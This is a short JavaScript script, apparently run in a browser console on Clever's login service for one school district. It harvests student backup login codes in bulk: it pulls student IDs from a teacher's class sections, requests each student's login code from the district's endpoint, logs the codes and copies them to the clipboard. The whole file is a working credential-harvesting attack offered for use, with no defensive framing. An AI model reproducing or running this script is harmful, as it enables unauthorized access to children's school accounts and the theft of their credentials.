async function fetchBC(studentid) {
  try {
    const request = await fetch("https://clever.com/in/ovsd.org/backup_login_code", {
      method: "POST",
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
      },
      referrerPolicy: "strict-origin-when-cross-origin",
      body: JSON.stringify({ "student_id": studentid }),
      credentials: "include"
    });

    return await request.json();

  } catch (error) {
    console.error(error);
  }
}

async function fetchIDs() {
  try {
    const response = await fetch('https://clever.com/in/ovsd.org/api/teacher/sections');
    if (!response.ok) {
      throw new Error(`uh oh ${response.status}`);
    }
    const data = await response.json();
    return data.sections[Math.floor(Math.random() * data.sections.length)].students;

  } catch (error) {
    console.error(error);
    return [];
  }
}


async function getCodes(numRequests, delay) {
    const loginCodes = [];
    
    // loops
      await fetchIDs().then(async data=>{
        for (let i = 0; i < numRequests; i++) {
        await fetchBC(data[Math.floor(Math.random() * data.length)]).then(async data=>{
          if (data.loginCode) {
            loginCodes.push(data.loginCode);
            console.log("code:", data.loginCode);
          } else {
            console.error("code not found in response body!");
          }
        })
        await setTimeout(() => {}, delay);
        }
      })

    // copier
    const list = loginCodes.join('\n');
    try {
      await navigator.clipboard.writeText(list);
      console.log("copied");
    } catch (err) {
      console.error(err);
    }

    console.log(loginCodes)
    return loginCodes
  }